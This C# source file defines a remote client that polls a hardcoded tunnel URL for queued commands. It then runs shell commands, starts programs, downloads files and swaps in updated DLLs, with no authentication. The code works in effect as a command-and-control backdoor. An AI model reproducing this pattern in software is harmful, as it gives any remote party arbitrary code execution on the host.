using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.Remoting;
using System.Text;
using System.Threading.Tasks;
using JGeneral.IO.Database;
using JGeneral.IO.Net.CommandArguments;

namespace JGeneral.IO.Net
{
    public class BasicRemoteClient : IRemoteClient
    {
        public string Id { get; }
        private string URL { get; set; }
        private HttpClient _internalClient { get; set; }
        public List<IRemoteCommand> Queue { get; set; }
        /// <returns>Whether the registration was successful.</returns>
        public async Task<bool> Register()
        {
            return (await _internalClient.PostAsync(URL, new StringContent($"Register {Id}"))).IsSuccessStatusCode;
        }
        public async Task<IRemoteCommand[]> CheckQueue()
        {
            var data = await _internalClient.GetByteArrayAsync(URL);
            var queue = Encoding.ASCII.GetString(data).FromJsonText<InternalRemoteCommand[]>();
            Queue = queue.Cast<IRemoteCommand>().ToList();
            return queue;
        }

        public async Task ExecuteLocalQueue()
        {
            var queue = Queue;
            if (queue.Count != 0)
            {
                //Console.WriteLine($"Queued {URL} & found {queue.Count} unresolved commands.");
            }
            else
            {
                //Console.WriteLine($"Queued {URL} & found no unresolved commands.");
            }
            for (int i = 0; i < queue.Count; i++)
            {
                var req = queue[i];
                bool doReset = true;
                try
                {
                    switch (req.RelayedCommand)
                    {
                        case Command.ProgramStart:
                        {
                            Encoding.ASCII.GetString(req.TransferredData).FromJsonText<ProgramStartArgs>().CreateAndRun();
                            break;
                        }
                        case Command.ProgramEnd:
                        {
                            Encoding.ASCII.GetString(req.TransferredData).FromJsonText<ProgramEndArgs>().End();
                            break;
                        }    
                        case Command.Update:
                        {
                            var altReq = req as InternalRemoteCommand;
                            var data = Encoding.ASCII.GetString(altReq.TransferredData).FromJsonText<UpdateArgs>();
                            data.UpdateDll();
                            altReq.TransferredData = new byte[0];
                            await _internalClient.PutAsync(URL, new StringContent(altReq.ToJson(), Encoding.ASCII));
                            Startup.Restart(2000);
                            break;
                        }    
                        case Command.Download:
                        {
                            var data = Encoding.ASCII.GetString(req.TransferredData).FromJsonText<DownloadArgs>();
                            var fileId = data.URL.Split('/').Last();
                            var file = await _internalClient.GetByteArrayAsync(data.URL);
                            File.WriteAllBytes($"{Environment.CurrentDirectory}/.temp/{fileId}", file);
                            break;
                        }   
                        case Command.Shell:
                        {
                            Encoding.ASCII.GetString(req.TransferredData).FromJsonText<ShellArgs>().CreateAndRun();
                            break;
                        }
                        case Command.FileCreate:
                        {
                            Encoding.ASCII.GetString(req.TransferredData).FromJsonText<ShellArgs>().CreateAndRun();
                            break;
                        }
                        case Command.FileDelete:
                        {
                            Encoding.ASCII.GetString(req.TransferredData).FromJsonText<ShellArgs>().CreateAndRun();
                            break;
                        }
                        case Command.ProgramNames:
                        {
                            
                            break;
                        }
                        case Command.ProgramPIDs:
                        {
                            
                            break;
                        }
                        
                        default:
                        {
                            doReset = false;
                            break;
                        }
                    }
                }
                catch
                {
                    doReset = false;
                }
                if (doReset)
                {
                    await _internalClient.PutAsync(URL, new StringContent(req.ToJson(), Encoding.ASCII));
                }
                Queue.RemoveAll(x => x.CommandId == req.CommandId);
            }
        }
        public BasicRemoteClient(string id)
        {
            this.Id = id;
            URL = $"https://atriplex.loophole.site/{id.Replace(' ', '-')}";
            _internalClient = new HttpClient();
            _internalClient.Timeout = TimeSpan.FromSeconds(5);
            Queue = new List<IRemoteCommand>();
        }
    }
}